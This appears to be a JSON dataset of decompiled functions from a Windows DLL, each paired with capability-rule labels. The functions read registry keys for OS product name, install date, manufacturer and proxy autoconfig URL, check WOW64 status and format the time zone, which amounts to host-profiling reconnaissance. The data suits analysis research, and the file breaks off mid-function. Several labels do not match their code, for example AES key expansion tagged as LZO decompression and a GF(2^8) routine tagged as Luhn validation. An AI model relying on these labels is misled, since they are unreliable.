{
    "18000100": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t * fcn.180001000(int32_t *arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    int32_t iStack16;\n    \n    // [00] -r-x section size 86016 named .text\n    *arg1 = 4;\n    if (arg2 == 0x80) {\n        arg1[1] = 4;\n        arg1[2] = 10;\n    }\n    else if (arg2 == 0xc0) {\n        arg1[1] = 6;\n        arg1[2] = 0xc;\n    }\n    else if (arg2 == 0x100) {\n        arg1[1] = 8;\n        arg1[2] = 0xe;\n    }\n    else {\n        uStack24 = 0x180018c90;\n        iStack16 = arg2;\n        fcn.18000b170(&uStack24, 0x1800199a8);\n    }\n    arg1[3] = *arg1 << 2;\n    return arg1;\n}\n",
        "token_count": 237
    },
    "1800017f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nuint8_t fcn.1800017f0(ulong arg1)\n\n{\n    uint8_t in_DL;\n    uint8_t uStackX16;\n    \n    uStackX16 = in_DL << 1;\n    if ((in_DL & 0x80) != 0) {\n        uStackX16 = uStackX16 ^ 0x1b;\n    }\n    return uStackX16;\n}\n",
        "token_count": 90
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "180001d7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.180001d70(int32_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint8_t *arg1_00;\n    ulong arg1_01;\n    int32_t iStack64;\n    \n    arg1_00 = fcn.18000a008(4);\n    arg1_01 = fcn.18000a008(4);\n    for (iStack64 = 0; iStack64 < arg1[1] * 4; iStack64 = iStack64 + 1) {\n        *(arg3 + iStack64) = *(arg2 + iStack64);\n    }\n    for (iStack64 = arg1[1] << 2; iStack64 < *arg1 * 4 * (arg1[2] + 1); iStack64 = iStack64 + 4) {\n        *arg1_00 = *(arg3 + (iStack64 + -4));\n        arg1_00[1] = *(arg3 + (iStack64 + -3));\n        arg1_00[2] = *(arg3 + (iStack64 + -2));\n        arg1_00[3] = *(arg3 + (iStack64 + -1));\n        if ((iStack64 + (iStack64 >> 0x1f & 3U) >> 2) % arg1[1] == 0) {\n            fcn.180001c30(arg1, arg1_00);\n            fcn.180001ba0(arg1, arg1_00);\n            fcn.180001cf0(arg1, arg1_01, iStack64 / (arg1[1] << 2) & 0xffffffff);\n            fcn.180001c90(arg1, arg1_00, arg1_01, arg1_00);\n        }\n        else if ((6 < arg1[1]) && ((iStack64 + (iStack64 >> 0x1f & 3U) >> 2) % arg1[1] == 4)) {\n            fcn.180001ba0(arg1, arg1_00);\n        }\n        *(arg3 + iStack64) = *(arg3 + (iStack64 + arg1[1] * -4)) ^ *arg1_00;\n        *(arg3 + (iStack64 + 1)) = *(arg3 + (iStack64 + 1 + arg1[1] * -4)) ^ arg1_00[1];\n        *(arg3 + (iStack64 + 2)) = *(arg3 + (iStack64 + 2 + arg1[1] * -4)) ^ arg1_00[2];\n        *(arg3 + (iStack64 + 3)) = *(arg3 + (iStack64 + 3 + arg1[1] * -4)) ^ arg1_00[3];\n    }\n    fcn.18000a028(arg1_01);\n    fcn.18000a028(arg1_00);\n    return;\n}\n",
        "token_count": 666
    },
    "1800020d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.1800020d0(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint auStack24 [6];\n    \n    auStack24[0] = 0;\n    if (*0x18001d660 == NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32\");\n        *0x18001d660 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"IsWow64Process\");\n    }\n    if (*0x18001d660 != NULL) {\n        iVar1 = (**0x18001d660)(arg1, auStack24);\n        if (iVar1 == 0) {\n            auStack24[0] = 0;\n        }\n    }\n    return auStack24[0];\n}\n",
        "token_count": 183
    },
    "18000232": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.180002320(int16_t *arg1)\n\n{\n    ulong arg1_00;\n    int64_t iVar1;\n    ushort *arg3;\n    uchar *puVar2;\n    ulong uStack472;\n    int32_t iStack464;\n    ushort uStack456;\n    ushort uStack454;\n    ushort uStack452;\n    ushort uStack450;\n    ushort uStack448;\n    ushort uStack446;\n    ushort uStack444;\n    ushort uStack442;\n    ushort uStack440;\n    ushort uStack438;\n    ushort uStack436;\n    ushort uStack434;\n    char acStack432 [8];\n    ushort uStack424;\n    ushort uStack422;\n    ushort uStack420;\n    ushort uStack418;\n    ushort uStack416;\n    ushort uStack414;\n    ushort uStack412;\n    ushort uStack410;\n    int32_t iStack408;\n    ushort uStack392;\n    ushort uStack390;\n    ushort uStack388;\n    ushort uStack386;\n    ushort uStack384;\n    ushort uStack382;\n    ushort uStack380;\n    ushort uStack378;\n    ushort uStack376;\n    ushort uStack374;\n    ushort uStack372;\n    ushort uStack370;\n    ushort uStack368;\n    ushort uStack366;\n    ushort uStack364;\n    ushort uStack362;\n    ushort uStack360;\n    ushort uStack358;\n    ushort uStack356;\n    ushort uStack354;\n    ushort uStack352;\n    ushort uStack350;\n    ushort uStack348;\n    ushort uStack346;\n    ushort uStack344;\n    ushort uStack342;\n    ushort uStack340;\n    ushort uStack338;\n    ushort uStack336;\n    ushort uStack334;\n    ushort uStack332;\n    ushort uStack330;\n    ushort uStack328;\n    ushort uStack326;\n    ushort uStack324;\n    ushort uStack322;\n    ushort uStack320;\n    ushort uStack318;\n    ushort uStack316;\n    ushort uStack314;\n    ushort uStack312;\n    ushort uStack310;\n    ushort uStack308;\n    ushort uStack306;\n    ushort uStack304;\n    int32_t iStack296;\n    ushort uStack280;\n    uchar auStack278 [206];\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    uchar auStack48 [4];\n    uint uStack44;\n    ushort uStack40;\n    ushort uStack38;\n    ushort uStack36;\n    ushort uStack34;\n    ushort uStack32;\n    ushort uStack30;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    \n    uStack456 = 0x50;\n    uStack454 = 0x72;\n    uStack452 = 0x6f;\n    uStack450 = 100;\n    uStack448 = 0x75;\n    uStack446 = 99;\n    uStack444 = 0x74;\n    uStack442 = 0x4e;\n    uStack440 = 0x61;\n    uStack438 = 0x6d;\n    uStack436 = 0x65;\n    uStack434 = 0;\n    uStack392 = 0x53;\n    uStack390 = 0x6f;\n    uStack388 = 0x66;\n    uStack386 = 0x74;\n    uStack384 = 0x77;\n    uStack382 = 0x61;\n    uStack380 = 0x72;\n    uStack378 = 0x65;\n    uStack376 = 0x5c;\n    uStack374 = 0x4d;\n    uStack372 = 0x69;\n    uStack370 = 99;\n    uStack368 = 0x72;\n    uStack366 = 0x6f;\n    uStack364 = 0x73;\n    uStack362 = 0x6f;\n    uStack360 = 0x66;\n    uStack358 = 0x74;\n    uStack356 = 0x5c;\n    uStack354 = 0x57;\n    uStack352 = 0x69;\n    uStack350 = 0x6e;\n    uStack348 = 100;\n    uStack346 = 0x6f;\n    uStack344 = 0x77;\n    uStack342 = 0x73;\n    uStack340 = 0x20;\n    uStack338 = 0x4e;\n    uStack336 = 0x54;\n    uStack334 = 0x5c;\n    uStack332 = 0x43;\n    uStack330 = 0x75;\n    uStack328 = 0x72;\n    uStack326 = 0x72;\n    uStack324 = 0x65;\n    uStack322 = 0x6e;\n    uStack320 = 0x74;\n    uStack318 = 0x56;\n    uStack316 = 0x65;\n    uStack314 = 0x72;\n    uStack312 = 0x73;\n    uStack310 = 0x69;\n    uStack308 = 0x6f;\n    uStack306 = 0x6e;\n    uStack304 = 0;\n    uStack424 = 0x55;\n    uStack422 = 0x6e;\n    uStack420 = 0x6b;\n    uStack418 = 0x6e;\n    uStack416 = 0x6f;\n    uStack414 = 0x77;\n    uStack412 = 0x6e;\n    uStack410 = 0;\n    acStack432[0] = '\\0';\n    fcn.180002260(acStack432);\n    arg1_00 = (**0x18001df18)();\n    iStack464 = fcn.1800020d0(arg1_00);\n    if ((acStack432[0] == '\\0') || (iStack464 == 0)) {\n        puVar2 = 0x20019;\n        arg3 = NULL;\n        iStack408 = (**0x18001df98)(0xffffffff80000002, &uStack392, 0, 0x20019, &uStack472);\n    }\n    else {\n        puVar2 = 0x20119;\n        arg3 = NULL;\n        iStack408 = (**0x18001df98)(0xffffffff80000002, &uStack392, 0, 0x20119, &uStack472);\n    }\n    if (iStack408 == 0) {\n        uStack280 = 0;\n        puVar2 = auStack278;\n        for (iVar1 = 0xc6; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        uStack44 = 100;\n        uStack72 = 0x50;\n        uStack70 = 0x72;\n        uStack68 = 0x6f;\n        uStack66 = 100;\n        uStack64 = 0x75;\n        uStack62 = 99;\n        uStack60 = 0x74;\n        uStack58 = 0x4e;\n        uStack56 = 0x61;\n        uStack54 = 0x6d;\n        uStack52 = 0x65;\n        uStack50 = 0;\n        puVar2 = auStack48;\n        arg3 = NULL;\n        iStack296 = (**0x18001dfa8)(uStack472, &uStack72, 0, puVar2, &uStack280, &uStack44);\n        if (iStack296 == 0) {\n            arg3 = &uStack280;\n            fcn.18000a0ac(arg1, 0x18001887c, arg3, puVar2);\n        }\n    }\n    if (*arg1 == 0) {\n        uStack40 = 0x55;\n        uStack38 = 0x6e;\n        uStack36 = 0x6b;\n        uStack34 = 0x6e;\n        uStack32 = 0x6f;\n        uStack30 = 0x77;\n        uStack28 = 0x6e;\n        uStack26 = 0xd;\n        uStack24 = 10;\n        uStack22 = 0;\n        fcn.18000a0ac(arg1, &uStack40, arg3, puVar2);\n    }\n    return arg1;\n}\n",
        "token_count": 1936
    },
    "180002c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180002c20(ulong arg1, ulong arg2)\n\n{\n    ushort uStack280;\n    ushort uStack278;\n    ushort uStack276;\n    ushort uStack274;\n    int32_t iStack272;\n    int32_t aiStack264 [44];\n    uint uStack88;\n    ushort uStack80;\n    ushort uStack78;\n    ushort uStack76;\n    ushort uStack74;\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack48;\n    ushort uStack46;\n    ushort uStack44;\n    ushort uStack42;\n    ushort uStack40;\n    int32_t iStack32;\n    char cStack28;\n    int32_t iStack24;\n    \n    uStack88 = (**0x18001df40)(aiStack264);\n    if (aiStack264[0] < 0) {\n        iStack32 = -aiStack264[0];\n    }\n    else {\n        iStack32 = aiStack264[0];\n    }\n    iStack272 = iStack32;\n    uStack280 = 0x55;\n    uStack278 = 0x54;\n    uStack276 = 0x43;\n    uStack274 = 0;\n    uStack80 = 0x25;\n    uStack78 = 0x73;\n    uStack76 = 0x28;\n    uStack74 = 0x25;\n    uStack72 = 99;\n    uStack70 = 0x25;\n    uStack68 = 0x30;\n    uStack66 = 0x32;\n    uStack64 = 100;\n    uStack62 = 0x3a;\n    uStack60 = 0x25;\n    uStack58 = 0x30;\n    uStack56 = 0x32;\n    uStack54 = 100;\n    uStack52 = 0x29;\n    uStack50 = 0x20;\n    uStack48 = 0x25;\n    uStack46 = 0x73;\n    uStack44 = 0xd;\n    uStack42 = 10;\n    uStack40 = 0;\n    if (aiStack264[0] < 1) {\n        cStack28 = '+';\n    }\n    else {\n        cStack28 = '-';\n    }\n    iStack24 = iStack32 % 0x3c;\n    fcn.18000a0ac(arg1, &uStack80, &uStack280, cStack28);\n    return arg1;\n}\n",
        "token_count": 605
    },
    "180002e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.180002e30(int16_t *arg1)\n\n{\n    ulong arg1_00;\n    uint64_t arg4;\n    ushort uStack216;\n    ushort uStack214;\n    ushort uStack212;\n    ushort uStack210;\n    ushort uStack208;\n    ushort uStack206;\n    ushort uStack204;\n    ushort uStack202;\n    ushort uStack200;\n    ushort uStack198;\n    ushort uStack196;\n    ushort uStack194;\n    ulong uStack192;\n    uint uStack184;\n    int32_t iStack180;\n    char acStack176 [8];\n    ushort uStack168;\n    ushort uStack166;\n    ushort uStack164;\n    ushort uStack162;\n    ushort uStack160;\n    ushort uStack158;\n    ushort uStack156;\n    ushort uStack154;\n    ushort uStack152;\n    ushort uStack150;\n    ushort uStack148;\n    ushort uStack146;\n    ushort uStack144;\n    ushort uStack142;\n    ushort uStack140;\n    ushort uStack138;\n    ushort uStack136;\n    ushort uStack134;\n    ushort uStack132;\n    ushort uStack130;\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    ushort uStack122;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    ushort uStack112;\n    ushort uStack110;\n    ushort uStack108;\n    ushort uStack106;\n    ushort uStack104;\n    ushort uStack102;\n    ushort uStack100;\n    ushort uStack98;\n    ushort uStack96;\n    ushort uStack94;\n    ushort uStack92;\n    ushort uStack90;\n    ushort uStack88;\n    ushort uStack86;\n    ushort uStack84;\n    ushort uStack82;\n    ushort uStack80;\n    ushort uStack78;\n    ushort uStack76;\n    ushort uStack74;\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint32_t uStack44;\n    uint auStack40 [2];\n    int64_t iStack32;\n    uint64_t auStack24 [3];\n    \n    uStack184 = 4;\n    uStack216 = 0x49;\n    uStack214 = 0x6e;\n    uStack212 = 0x73;\n    uStack210 = 0x74;\n    uStack208 = 0x61;\n    uStack206 = 0x6c;\n    uStack204 = 0x6c;\n    uStack202 = 0x44;\n    uStack200 = 0x61;\n    uStack198 = 0x74;\n    uStack196 = 0x65;\n    uStack194 = 0;\n    uStack152 = 0x53;\n    uStack150 = 0x6f;\n    uStack148 = 0x66;\n    uStack146 = 0x74;\n    uStack144 = 0x77;\n    uStack142 = 0x61;\n    uStack140 = 0x72;\n    uStack138 = 0x65;\n    uStack136 = 0x5c;\n    uStack134 = 0x4d;\n    uStack132 = 0x69;\n    uStack130 = 99;\n    uStack128 = 0x72;\n    uStack126 = 0x6f;\n    uStack124 = 0x73;\n    uStack122 = 0x6f;\n    uStack120 = 0x66;\n    uStack118 = 0x74;\n    uStack116 = 0x5c;\n    uStack114 = 0x57;\n    uStack112 = 0x69;\n    uStack110 = 0x6e;\n    uStack108 = 100;\n    uStack106 = 0x6f;\n    uStack104 = 0x77;\n    uStack102 = 0x73;\n    uStack100 = 0x20;\n    uStack98 = 0x4e;\n    uStack96 = 0x54;\n    uStack94 = 0x5c;\n    uStack92 = 0x43;\n    uStack90 = 0x75;\n    uStack88 = 0x72;\n    uStack86 = 0x72;\n    uStack84 = 0x65;\n    uStack82 = 0x6e;\n    uStack80 = 0x74;\n    uStack78 = 0x56;\n    uStack76 = 0x65;\n    uStack74 = 0x72;\n    uStack72 = 0x73;\n    uStack70 = 0x69;\n    uStack68 = 0x6f;\n    uStack66 = 0x6e;\n    uStack64 = 0;\n    uStack168 = 0x55;\n    uStack166 = 0x6e;\n    uStack164 = 0x6b;\n    uStack162 = 0x6e;\n    uStack160 = 0x6f;\n    uStack158 = 0x77;\n    uStack156 = 0x6e;\n    uStack154 = 0;\n    acStack176[0] = '\\0';\n    fcn.180002260(acStack176);\n    arg1_00 = (**0x18001df18)();\n    iStack180 = fcn.1800020d0(arg1_00);\n    if ((acStack176[0] == '\\0') || (iStack180 == 0)) {\n        arg4 = 0x20019;\n        iStack56 = (**0x18001df98)(0xffffffff80000002, &uStack152, 0, 0x20019, &uStack192);\n    }\n    else {\n        arg4 = 0x20119;\n        iStack56 = (**0x18001df98)(0xffffffff80000002, &uStack152, 0, 0x20119, &uStack192);\n    }\n    if (iStack56 == 0) {\n        uStack48 = 4;\n        uStack44 = 0;\n        auStack40[0] = 4;\n        arg4 = 0;\n        iStack52 = (**0x18001dfa8)(uStack192, &uStack216, 0, 0, &uStack44, auStack40);\n        if (iStack52 == 0) {\n            fcn.1800020b0(0);\n            auStack24[0] = uStack44;\n            iStack32 = fcn.180002090(auStack24);\n            arg4 = *(iStack32 + 0x10) + 1;\n            fcn.18000a0ac(arg1, 0x180018968, *(iStack32 + 0x14) + 0x76c, arg4);\n        }\n    }\n    if (*arg1 == 0) {\n        fcn.18000a0ac(arg1, L\"%s\\r\\n\", &uStack168, arg4);\n    }\n    return arg1;\n}\n",
        "token_count": 1596
    },
    "1800034b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.1800034b0(int16_t *arg1)\n\n{\n    ulong arg1_00;\n    int64_t iVar1;\n    uchar *puVar2;\n    ushort *arg4;\n    ushort uStack712;\n    ushort uStack710;\n    ushort uStack708;\n    ushort uStack706;\n    ushort uStack704;\n    ushort uStack702;\n    ushort uStack700;\n    ushort uStack698;\n    ushort uStack696;\n    ushort uStack694;\n    ushort uStack692;\n    ushort uStack690;\n    ushort uStack688;\n    ushort uStack686;\n    ushort uStack684;\n    ushort uStack682;\n    ushort uStack680;\n    ushort uStack678;\n    ushort uStack676;\n    ushort uStack672;\n    ushort uStack670;\n    ushort uStack668;\n    ushort uStack666;\n    ushort uStack664;\n    ushort uStack662;\n    ushort uStack660;\n    ushort uStack658;\n    ushort uStack656;\n    ushort uStack654;\n    ushort uStack652;\n    ushort uStack650;\n    ushort uStack648;\n    ushort uStack646;\n    ushort uStack644;\n    ushort uStack642;\n    ushort uStack640;\n    ushort uStack638;\n    ulong uStack632;\n    uint uStack624;\n    int32_t iStack620;\n    char acStack616 [8];\n    ushort uStack608;\n    ushort uStack606;\n    ushort uStack604;\n    ushort uStack602;\n    ushort uStack600;\n    ushort uStack598;\n    ushort uStack596;\n    ushort uStack594;\n    ushort uStack584;\n    ushort uStack582;\n    ushort uStack580;\n    ushort uStack578;\n    ushort uStack576;\n    ushort uStack574;\n    ushort uStack572;\n    ushort uStack570;\n    ushort uStack568;\n    ushort uStack566;\n    ushort uStack564;\n    ushort uStack562;\n    ushort uStack560;\n    ushort uStack558;\n    ushort uStack556;\n    ushort uStack554;\n    ushort uStack552;\n    ushort uStack550;\n    ushort uStack548;\n    ushort uStack546;\n    ushort uStack544;\n    ushort uStack542;\n    ushort uStack540;\n    ushort uStack538;\n    ushort uStack536;\n    ushort uStack534;\n    ushort uStack532;\n    ushort uStack530;\n    ushort uStack528;\n    ushort uStack526;\n    ushort uStack524;\n    ushort uStack522;\n    ushort uStack520;\n    ushort uStack518;\n    ushort uStack516;\n    ushort uStack514;\n    ushort uStack512;\n    ushort uStack510;\n    ushort uStack508;\n    ushort uStack506;\n    ushort uStack504;\n    ushort uStack502;\n    ushort uStack500;\n    ushort uStack498;\n    ushort uStack496;\n    ushort uStack494;\n    ushort uStack492;\n    ushort uStack490;\n    ushort uStack488;\n    ushort uStack486;\n    ushort uStack484;\n    int32_t iStack472;\n    int32_t iStack468;\n    ushort uStack456;\n    uchar auStack454 [206];\n    uint uStack248;\n    ushort uStack232;\n    uchar auStack230 [206];\n    uint uStack24;\n    ushort auStack20 [6];\n    \n    uStack624 = 4;\n    uStack584 = 0x53;\n    uStack582 = 0x59;\n    uStack580 = 0x53;\n    uStack578 = 0x54;\n    uStack576 = 0x45;\n    uStack574 = 0x4d;\n    uStack572 = 0x5c;\n    uStack570 = 0x43;\n    uStack568 = 0x75;\n    uStack566 = 0x72;\n    uStack564 = 0x72;\n    uStack562 = 0x65;\n    uStack560 = 0x6e;\n    uStack558 = 0x74;\n    uStack556 = 0x43;\n    uStack554 = 0x6f;\n    uStack552 = 0x6e;\n    uStack550 = 0x74;\n    uStack548 = 0x72;\n    uStack546 = 0x6f;\n    uStack544 = 0x6c;\n    uStack542 = 0x53;\n    uStack540 = 0x65;\n    uStack538 = 0x74;\n    uStack536 = 0x5c;\n    uStack534 = 0x43;\n    uStack532 = 0x6f;\n    uStack530 = 0x6e;\n    uStack528 = 0x74;\n    uStack526 = 0x72;\n    uStack524 = 0x6f;\n    uStack522 = 0x6c;\n    uStack520 = 0x5c;\n    uStack518 = 0x53;\n    uStack516 = 0x79;\n    uStack514 = 0x73;\n    uStack512 = 0x74;\n    uStack510 = 0x65;\n    uStack508 = 0x6d;\n    uStack506 = 0x49;\n    uStack504 = 0x6e;\n    uStack502 = 0x66;\n    uStack500 = 0x6f;\n    uStack498 = 0x72;\n    uStack496 = 0x6d;\n    uStack494 = 0x61;\n    uStack492 = 0x74;\n    uStack490 = 0x69;\n    uStack488 = 0x6f;\n    uStack486 = 0x6e;\n    uStack484 = 0;\n    uStack712 = 0x53;\n    uStack710 = 0x79;\n    uStack708 = 0x73;\n    uStack706 = 0x74;\n    uStack704 = 0x65;\n    uStack702 = 0x6d;\n    uStack700 = 0x4d;\n    uStack698 = 0x61;\n    uStack696 = 0x6e;\n    uStack694 = 0x75;\n    uStack692 = 0x66;\n    uStack690 = 0x61;\n    uStack688 = 99;\n    uStack686 = 0x74;\n    uStack684 = 0x75;\n    uStack682 = 0x72;\n    uStack680 = 0x65;\n    uStack678 = 0x72;\n    uStack676 = 0;\n    uStack672 = 0x53;\n    uStack670 = 0x79;\n    uStack668 = 0x73;\n    uStack666 = 0x74;\n    uStack664 = 0x65;\n    uStack662 = 0x6d;\n    uStack660 = 0x50;\n    uStack658 = 0x72;\n    uStack656 = 0x6f;\n    uStack654 = 100;\n    uStack652 = 0x75;\n    uStack650 = 99;\n    uStack648 = 0x74;\n    uStack646 = 0x4e;\n    uStack644 = 0x61;\n    uStack642 = 0x6d;\n    uStack640 = 0x65;\n    uStack638 = 0;\n    uStack608 = 0x55;\n    uStack606 = 0x6e;\n    uStack604 = 0x6b;\n    uStack602 = 0x6e;\n    uStack600 = 0x6f;\n    uStack598 = 0x77;\n    uStack596 = 0x6e;\n    uStack594 = 0;\n    acStack616[0] = '\\0';\n    fcn.180002260(acStack616);\n    arg1_00 = (**0x18001df18)();\n    iStack620 = fcn.1800020d0(arg1_00);\n    if ((acStack616[0] == '\\0') || (iStack620 == 0)) {\n        arg4 = 0x20019;\n        iStack472 = (**0x18001df98)(0xffffffff80000002, &uStack584, 0, 0x20019, &uStack632);\n    }\n    else {\n        arg4 = 0x20119;\n        iStack472 = (**0x18001df98)(0xffffffff80000002, &uStack584, 0, 0x20119, &uStack632);\n    }\n    if (iStack472 == 0) {\n        uStack248 = 4;\n        uStack232 = 0;\n        puVar2 = auStack230;\n        for (iVar1 = 0xc6; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        uStack456 = 0;\n        puVar2 = auStack454;\n        for (iVar1 = 0xc6; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        uStack24 = 100;\n        iStack468 = (**0x18001dfa8)(uStack632, &uStack712, 0, auStack20, &uStack232, &uStack24);\n        uStack24 = 100;\n        arg4 = auStack20;\n        iStack468 = (**0x18001dfa8)(uStack632, &uStack672, 0, arg4, &uStack456, &uStack24);\n        if (iStack468 == 0) {\n            arg4 = &uStack456;\n            fcn.18000a0ac(arg1, L\"%s (%s) - \", &uStack232, arg4);\n        }\n    }\n    if (*arg1 == 0) {\n        fcn.18000a0ac(arg1, L\"%s - \", &uStack608, arg4);\n    }\n    return arg1;\n}\n",
        "token_count": 2231
    },
    "180003b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.180003b30(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uchar *puVar5;\n    ushort *puVar6;\n    int16_t *piVar7;\n    ushort uStack760;\n    ushort uStack758;\n    ushort uStack756;\n    ushort uStack754;\n    ushort uStack752;\n    ushort uStack750;\n    ushort uStack748;\n    ushort uStack746;\n    ushort uStack744;\n    ushort uStack742;\n    ushort uStack740;\n    ushort uStack738;\n    ushort uStack736;\n    ushort uStack734;\n    ushort uStack732;\n    ushort uStack730;\n    ushort uStack728;\n    ushort uStack726;\n    ushort uStack724;\n    ushort uStack722;\n    ushort uStack720;\n    ushort uStack718;\n    ushort uStack716;\n    ushort uStack714;\n    ushort uStack712;\n    ushort uStack710;\n    ushort uStack708;\n    ushort uStack706;\n    ulong uStack704;\n    uint uStack696;\n    int32_t iStack692;\n    ushort uStack688;\n    ushort uStack686;\n    ushort uStack684;\n    ushort uStack682;\n    ushort uStack680;\n    ushort uStack678;\n    ushort uStack676;\n    ushort uStack674;\n    ushort uStack672;\n    ushort uStack670;\n    ushort uStack668;\n    ushort uStack666;\n    char acStack664 [8];\n    ushort uStack656;\n    ushort uStack654;\n    ushort uStack652;\n    ushort uStack650;\n    ushort uStack648;\n    ushort uStack646;\n    ushort uStack644;\n    ushort uStack642;\n    ushort uStack640;\n    ushort uStack638;\n    ushort uStack636;\n    ushort uStack634;\n    ushort uStack632;\n    ushort uStack630;\n    ushort uStack616;\n    ushort uStack614;\n    ushort uStack612;\n    ushort uStack610;\n    ushort uStack608;\n    ushort uStack606;\n    ushort uStack604;\n    ushort uStack602;\n    ushort uStack600;\n    ushort uStack598;\n    ushort uStack596;\n    ushort uStack594;\n    ushort uStack592;\n    ushort uStack590;\n    ushort uStack588;\n    ushort uStack586;\n    ushort uStack584;\n    ushort uStack582;\n    ushort uStack580;\n    ushort uStack578;\n    ushort uStack576;\n    ushort uStack574;\n    ushort uStack572;\n    ushort uStack570;\n    ushort uStack568;\n    ushort uStack566;\n    ushort uStack564;\n    ushort uStack562;\n    ushort uStack560;\n    ushort uStack558;\n    ushort uStack556;\n    ushort uStack554;\n    ushort uStack552;\n    ushort uStack550;\n    ushort uStack548;\n    ushort uStack546;\n    ushort uStack544;\n    ushort uStack542;\n    ushort uStack540;\n    ushort uStack538;\n    ushort uStack536;\n    ushort uStack534;\n    ushort uStack532;\n    ushort uStack530;\n    ushort uStack528;\n    ushort uStack526;\n    ushort uStack524;\n    ushort uStack522;\n    ushort uStack520;\n    ushort uStack518;\n    ushort uStack516;\n    ushort uStack514;\n    ushort uStack512;\n    ushort uStack510;\n    ushort uStack508;\n    ushort uStack506;\n    ushort uStack504;\n    ushort uStack502;\n    ushort uStack500;\n    ushort uStack498;\n    int32_t iStack488;\n    ushort uStack480;\n    ushort uStack478;\n    ushort uStack476;\n    ushort uStack474;\n    ushort uStack472;\n    ushort uStack470;\n    ushort uStack468;\n    ushort uStack466;\n    ushort uStack464;\n    ushort uStack462;\n    ushort uStack460;\n    ushort uStack458;\n    ushort uStack456;\n    ushort uStack454;\n    ushort uStack452;\n    ushort uStack450;\n    ushort uStack448;\n    ushort uStack446;\n    ushort uStack444;\n    ushort uStack442;\n    int32_t iStack440;\n    uint uStack436;\n    ushort uStack424;\n    uchar auStack422 [398];\n    int32_t iStack24;\n    uint auStack20 [3];\n    \n    uStack696 = 4;\n    uStack480 = 0x41;\n    uStack478 = 0x75;\n    uStack476 = 0x74;\n    uStack474 = 0x6f;\n    uStack472 = 0x43;\n    uStack470 = 0x6f;\n    uStack468 = 0x6e;\n    uStack466 = 0x66;\n    uStack464 = 0x69;\n    uStack462 = 0x67;\n    uStack460 = 0x55;\n    uStack458 = 0x72;\n    uStack456 = 0x6c;\n    uStack454 = 0x3a;\n    uStack452 = 0x20;\n    uStack450 = 